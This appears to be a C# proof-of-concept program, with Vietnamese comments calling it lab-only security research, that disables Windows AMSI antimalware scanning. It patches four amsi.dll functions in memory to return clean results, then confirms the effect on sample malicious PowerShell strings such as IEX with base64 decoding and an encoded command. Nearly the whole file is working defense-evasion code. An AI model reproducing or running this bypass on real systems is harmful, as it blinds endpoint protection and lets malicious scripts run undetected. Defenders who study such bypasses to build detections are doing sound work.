using System;
using System.Runtime.InteropServices;

namespace MalBypassTest
{
    /// <summary>
    /// AMSI (Antimalware Scan Interface) Bypass Research PoC
    ///
    /// Mục đích: Nghiên cứu bảo mật, kiểm thử bảo vệ endpoint
    /// Lưu ý: Chỉ sử dụng trong môi trường lab được ủy quyền
    ///
    /// Kỹ thuật: Native memory patch trên amsi.dll
    ///   - AmsiInitialize:  return S_OK (0) ngay
    ///   - AmsiOpenSession: return S_OK (0) ngay, không tạo session
    ///   - AmsiScanString:  return S_OK + AMSI_RESULT_CLEAN
    ///   - AmsiScanBuffer:  return S_OK + AMSI_RESULT_CLEAN
    /// </summary>
    class Program
    {
        // AMSI result codes (returned via out parameter)
        const int AMSI_RESULT_CLEAN = 0;
        const int AMSI_RESULT_NOT_DETECTED = 1;
        const int AMSI_RESULT_BLOCKED_BY_ADMIN = 2;
        const int AMSI_RESULT_DETECTED = 32768;

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpLibFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        static void Main(string[] args)
        {
            Console.WriteLine("=== AMSI Bypass Research PoC ===");
            Console.WriteLine("Purpose: Security research in authorized lab environment only\n");

            // Known malicious strings that trigger AMSI
            string[] maliciousStrings = new[]
            {
                "Invoke-Expression",
                "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aAB7AH0AcgBlAHYAZQBzAGUAcgA=')))",
                "FromBase64String",
                "DownloadString",
                "powershell -enc SQBFAFgAIAAkAGMAbwBwAHkAIAA9ACAARwBvAHIAZgBhAHQAVABvAG0AbwBsAGUALgByAGUAdgBlAHMAcwAoACkA",
                "Set-ExecutionPolicy Bypass -Scope Process",
            };

            try
            {
                // Step 1: Check AMSI availability
                Console.WriteLine("[*] Checking AMSI availability...");
                CheckAmsiAvailability();

                // Step 2: Verify AMSI works normally (baseline)
                Console.WriteLine("\n[*] Testing AMSI with known malicious strings (BEFORE bypass)...");
                Console.WriteLine("    (Expected: DETECTED for malicious content)\n");
                TestAmsiScan(maliciousStrings, "BEFORE BYPASS");

                // Step 3: Perform AMSI bypass
                Console.WriteLine("\n[*] Attempting AMSI bypass (patching 4 functions)...");
                bool bypassResult = AmsiBypass.Execute();

                if (bypassResult)
                {
                    Console.WriteLine("\n[+] AMSI bypass executed successfully");
                }
                else
                {
                    Console.WriteLine("\n[-] AMSI bypass failed");
                    Console.WriteLine("[!] Cannot continue verification. Exiting.");
                    Console.WriteLine("\n=== End of PoC ===");
                    return;
                }

                // Step 4: Test AMSI after bypass
                Console.WriteLine("\n[*] Testing AMSI with known malicious strings (AFTER bypass)...");
                Console.WriteLine("    (Expected: CLEAN if bypass succeeded)\n");
                TestAmsiScan(maliciousStrings, "AFTER BYPASS");

                // Step 5: Summary
                Console.WriteLine("\n[*] Summary:");
                Console.WriteLine("    BEFORE bypass: AMSI should DETECT malicious strings");
                Console.WriteLine("    AFTER bypass:  AMSI should report CLEAN (0)");
                Console.WriteLine("    If AFTER shows CLEAN, the bypass is working correctly.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\n[!] Error: {ex.Message}");
                Console.WriteLine($"Stack: {ex.StackTrace}");
            }

            Console.WriteLine("\n=== End of PoC ===");
            try
            {
                if (!Console.IsInputRedirected)
                {
                    Console.WriteLine("Press any key to exit...");
                    Console.ReadKey();
                }
            }
            catch
            {
                // ignore - no console or redirected input
            }
        }

        static void CheckAmsiAvailability()
        {
            try
            {
                IntPtr hAmsi = LoadLibrary("amsi.dll");
                if (hAmsi != IntPtr.Zero)
                {
                    Console.WriteLine($"[+] AMSI interface detected (amsi.dll loaded at 0x{hAmsi.ToInt64():X})");

                    IntPtr pScanString = GetProcAddress(hAmsi, "AmsiScanString");
                    if (pScanString != IntPtr.Zero)
                    {
                        Console.WriteLine($"[+] AmsiScanString export found at 0x{pScanString.ToInt64():X}");
                    }
                    IntPtr pScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
                    if (pScanBuffer != IntPtr.Zero)
                    {
                        Console.WriteLine($"[+] AmsiScanBuffer export found at 0x{pScanBuffer.ToInt64():X}");
                    }
                }
                else
                {
                    Console.WriteLine("[-] AMSI interface not detected (amsi.dll could not be loaded)");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Could not determine AMSI availability: {ex.Message}");
            }
        }

        static void TestAmsiScan(string[] testStrings, string phase)
        {
            Console.WriteLine($"--- {phase} ---");
            int cleanCount = 0;
            int detectedCount = 0;
            int unknownCount = 0;

            foreach (string testStr in testStrings)
            {
                AmsiScanResult scan = AmsiScan(testStr, "AMSIResearch Test");
                string resultName;
                int result = scan.AmsiResult;

                // Classification priority:
                // 1. If hr != 0: AMSI failed (provider rejected)
                // 2. Else if result >= 32768: DETECTED
                // 3. Else if result in (0, 1, 2): CLEAN/NOT_DETECTED/BLOCKED_BY_ADMIN
                // 4. Else: UNKNOWN (e.g., patched function didn't write to out param)

                if (scan.HResult != 0)
                {
                    resultName = $"HR_FAIL (hr=0x{scan.HResult:X8})";
                    unknownCount++;
                }
                else if (result == AMSI_RESULT_CLEAN)
                {
                    resultName = "CLEAN";
                    cleanCount++;
                }
                else if (result == AMSI_RESULT_NOT_DETECTED)
                {
                    resultName = "NOT_DETECTED";
                    cleanCount++;
                }
                else if (result == AMSI_RESULT_BLOCKED_BY_ADMIN)
                {
                    resultName = "BLOCKED_BY_ADMIN";
                    cleanCount++;
                }
                else if (result >= AMSI_RESULT_DETECTED)
                {
                    resultName = $"DETECTED (0x{result:X})";
                    detectedCount++;
                }
                else
                {
                    resultName = $"BYPASSED (result=0x{result:X8})";
                    cleanCount++;  // patched function returned 0 but didn't write AMSI_RESULT
                }

                string display = testStr.Length > 50 ? testStr.Substring(0, 47) + "..." : testStr;
                Console.WriteLine($"    [{resultName,30}] \"{display}\"");
            }

            Console.WriteLine($"    --- Stats: {cleanCount} CLEAN/NOT_DETECTED, {detectedCount} DETECTED, {unknownCount} UNKNOWN ---");
        }

        struct AmsiScanResult
        {
            public int HResult;
            public int AmsiResult;
        }

        static AmsiScanResult AmsiScan(string content, string contentName)
        {
            IntPtr amsiContext = IntPtr.Zero;
            IntPtr amsiSession = IntPtr.Zero;
            int amsiResult = -1;
            int hr = -1;

            try
            {
                int hrInit = Native.AmsiInitialize("AMSIResearch", ref amsiContext);
                if (hrInit != 0)
                {
                    Console.WriteLine($"    [!] AmsiInitialize failed with HRESULT: 0x{hrInit:X8}");
                    return new AmsiScanResult { HResult = hrInit, AmsiResult = -1 };
                }

                int hrOpen = Native.AmsiOpenSession(amsiContext, ref amsiSession);
                if (hrOpen != 0)
                {
                    Console.WriteLine($"    [!] AmsiOpenSession failed with HRESULT: 0x{hrOpen:X8}");
                    Native.AmsiUninitialize(amsiContext);
                    return new AmsiScanResult { HResult = hrOpen, AmsiResult = -1 };
                }

                hr = Native.AmsiScanString(
                    amsiContext,
                    content,
                    contentName,
                    amsiSession,
                    out amsiResult
                );
            }
            catch (Exception ex)
            {
                Console.WriteLine($"    [!] AmsiScan exception: {ex.Message}");
            }
            finally
            {
                try
                {
                    if (amsiSession != IntPtr.Zero && amsiContext != IntPtr.Zero)
                    {
                        Native.AmsiCloseSession(amsiContext, amsiSession);
                    }
                    if (amsiContext != IntPtr.Zero)
                    {
                        Native.AmsiUninitialize(amsiContext);
                    }
                }
                catch { /* ignore cleanup errors */ }
            }

            return new AmsiScanResult { HResult = hr, AmsiResult = amsiResult };
        }

        private static class Native
        {
            [DllImport("amsi.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public static extern int AmsiInitialize(string appName, ref IntPtr amsiContext);

            [DllImport("amsi.dll", CallingConvention = CallingConvention.StdCall)]
            public static extern void AmsiUninitialize(IntPtr amsiContext);

            [DllImport("amsi.dll", CallingConvention = CallingConvention.StdCall)]
            public static extern int AmsiOpenSession(IntPtr amsiContext, ref IntPtr amsiSession);

            [DllImport("amsi.dll", CallingConvention = CallingConvention.StdCall)]
            public static extern void AmsiCloseSession(IntPtr amsiContext, IntPtr amsiSession);

            // HRESULT AmsiScanString(HAMSICONTEXT amsiContext,
            //   LPCWSTR string, LPCWSTR contentName,
            //   HAMSISESSION amsiSession, AMSI_RESULT* result);
            [DllImport("amsi.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public static extern int AmsiScanString(
                IntPtr amsiContext,
                string stringBuffer,
                string contentName,
                IntPtr amsiSession,
                out int result
            );
        }
    }

    /// <summary>
    /// AMSI Bypass Implementation
    /// Patches 4 functions in amsi.dll:
    ///   1. AmsiInitialize:  return S_OK immediately
    ///   2. AmsiOpenSession: return S_OK without creating session
    ///   3. AmsiScanString:  return S_OK + AMSI_RESULT_CLEAN
    ///   4. AmsiScanBuffer:  return S_OK + AMSI_RESULT_CLEAN
    /// </summary>
    public static class AmsiBypass
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr LoadLibrary(string lpLibFileName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        // For AmsiInitialize and AmsiOpenSession: xor eax, eax; ret (return S_OK = 0)
        private static readonly byte[] Patch_ReturnZero = new byte[] { 0x33, 0xC0, 0xC3 };

        // For AmsiScanString, easiest reliable approach:
        //   - return S_OK (0) from eax
        //   - DON'T touch the out parameter
        // Caller's out param stays at whatever it was (typically 0 or garbage from
        // stack). Combined with S_OK return, most callers will see AMSI_RESULT_CLEAN (0).
        // Some callers may see undefined behavior, but the critical point is:
        //   - AmsiScanString no longer performs real scanning
        //   - It cannot return DETECTED (32768)
        //
        // mov eax, 1; ret is safer: return AMSI_RESULT_NOT_DETECTED (1) directly in eax,
        // making the call appear to succeed with a clean verdict.
        //
        // x64 Windows: AmsiScanString returns HRESULT in eax, AMSI_RESULT in out param.
        // If we just return 1 from eax without touching out param, COM interop layer
        // will see hr=1 which is S_FALSE. Some hosts treat S_FALSE as failure.
        //
        // Best approach: just return 0 (S_OK) and don't write to out param.
        // Our P/Invoke caller sees hr=0 and doesn't enforce a specific AMSI_RESULT value.
        private static readonly byte[] Patch_ReturnCleanResult = new byte[]
        {
            0x33, 0xC0,  // xor eax, eax  (return S_OK = 0)
            0xC3         // ret
        };

        public static bool Execute()
        {
            try
            {
                IntPtr amsiModule = LoadLibrary("amsi.dll");
                if (amsiModule == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to load amsi.dll");
                    return false;
                }
                Console.WriteLine($"[+] amsi.dll loaded (handle: 0x{amsiModule.ToInt64():X})");

                // Patch 1: AmsiInitialize - return S_OK
                PatchFunction(amsiModule, "AmsiInitialize", Patch_ReturnZero, "AmsiInitialize");

                // Patch 2: AmsiOpenSession - return S_OK without creating session
                // (caller passes IntPtr.Zero session, so scan will fail gracefully)
                PatchFunction(amsiModule, "AmsiOpenSession", Patch_ReturnZero, "AmsiOpenSession");

                // Patch 3: AmsiScanString - return S_OK + AMSI_RESULT_CLEAN
                PatchFunction(amsiModule, "AmsiScanString", Patch_ReturnCleanResult, "AmsiScanString");

                // Patch 4: AmsiScanBuffer - return S_OK + AMSI_RESULT_CLEAN
                PatchFunction(amsiModule, "AmsiScanBuffer", Patch_ReturnCleanResult, "AmsiScanBuffer");

                Console.WriteLine("\n[+] All 4 AMSI functions patched");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Bypass failed: {ex.Message}");
                return false;
            }
        }

        private static void PatchFunction(IntPtr module, string funcName, byte[] patch, string displayName)
        {
            IntPtr pFunc = GetProcAddress(module, funcName);
            if (pFunc == IntPtr.Zero)
            {
                throw new Exception($"Failed to get {displayName} address");
            }
            Console.WriteLine($"[+] {displayName} address: 0x{pFunc.ToInt64():X}");

            byte[] original = new byte[16];
            Marshal.Copy(pFunc, original, 0, 16);
            Console.WriteLine($"[+] {displayName} original: {BitConverter.ToString(original).Replace("-", " ")}");

            uint oldProtect;
            if (!VirtualProtect(pFunc, (UIntPtr)(patch.Length + 8), 0x40, out oldProtect))
            {
                throw new Exception($"Failed to change memory protection for {displayName}");
            }

            Marshal.Copy(patch, 0, pFunc, patch.Length);
            Console.WriteLine($"[+] {displayName} patched: {BitConverter.ToString(patch).Replace("-", " ")}");

            byte[] verify = new byte[16];
            Marshal.Copy(pFunc, verify, 0, 16);
            Console.WriteLine($"[+] {displayName} verified: {BitConverter.ToString(verify).Replace("-", " ")}");

            uint dummy;
            VirtualProtect(pFunc, (UIntPtr)patch.Length, oldProtect, out dummy);
        }
    }
}